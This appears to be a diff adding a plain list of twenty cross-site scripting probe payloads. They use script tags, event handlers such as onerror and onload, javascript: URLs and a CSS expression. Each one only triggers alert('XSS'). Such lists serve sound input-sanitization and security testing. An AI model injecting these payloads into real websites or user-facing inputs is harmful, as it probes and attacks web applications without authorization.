@@ -1,0 +1,20 @@
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+<a href="javascript:alert('XSS')">Click me</a>
+<body onload="alert('XSS')">
+<input type="text" value="<script>alert('XSS')</script>">
+<div style="background-image: url(javascript:alert('XSS'))">
+<svg onload="alert('XSS')">
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
+<link rel="stylesheet" href="javascript:alert('XSS')">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<form action="javascript:alert('XSS')">
+<button onclick="alert('XSS')">Click me</button>
+<textarea onfocus="alert('XSS')"></textarea>
+<marquee onstart="alert('XSS')">XSS</marquee>
+<base href="javascript:alert('XSS')">
+<bgsound src="javascript:alert('XSS')">
+<isindex action="javascript:alert('XSS')">
+<xss style="xss:expression(alert('XSS'))">
